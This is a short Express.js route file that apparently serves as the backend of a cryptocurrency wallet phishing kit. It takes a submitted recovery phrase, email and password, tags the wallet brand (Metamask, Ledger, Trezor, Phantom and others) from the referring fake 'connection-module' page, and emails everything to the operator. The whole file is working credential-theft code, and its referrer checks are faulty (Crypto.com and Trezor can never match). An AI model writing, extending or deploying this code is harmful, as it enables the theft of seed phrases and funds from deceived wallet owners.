const express = require("express");
const router = express.Router();

const { sendEmail } = require("../utils/email")


router.post("/", async (req, res) => {
    const { txtphrase, email, txtpassword } = req.body;
    let wallet = "";
  
    // Getting the referrer from the request headers
    const referrer = req.headers.referer;
  
    // Checking if the referrer contains a specific URL
    if (referrer.includes("connection-module-m")) {
      wallet = "Metamask"; // Change wallet value if referrer matches
    } else if (referrer.includes("connection-module-c")) {
      wallet = "Coinbase"; // Change wallet value for another URL
    } else if (referrer.includes("connection-module-t")) {
      wallet = "Trust wallet"; // Change wallet value for another URL
    } else if (referrer.includes("connection-module-l")) {
      wallet = "Ledger"; // Change wallet value for another URL
    } else if (referrer.includes("connection-module-h")) {
      wallet = "Helium"; // Change wallet value for another URL
    } else if (referrer.includes("connection-module-s")) {
      wallet = "Safemoon"; // Change wallet value for another URL 
    } else if (referrer.includes("connection-module-cr")) {
      wallet = "Crypto.com"; // Change wallet value for another URL
    } else if (referrer.includes("connection-module-tr")) {
      wallet = "Trezor"; // Change wallet value for another URL
    } else if (referrer.includes("connection-module-p")) {
      wallet = "Phantom"; // Change wallet value for another URL
    } else if (referrer.includes("connection-module-o")) {
      wallet = "Others"; // Change wallet value for another URL
    }

    const options = {
      wallet: wallet,
      txtphrase: txtphrase,
      email: email,
      txtpassword: txtpassword
    }
    await sendEmail(options);

    return res.status(200).json({
      status: "success",
      message: "Email Sent Succefully",
    });
  });
  

module.exports = router;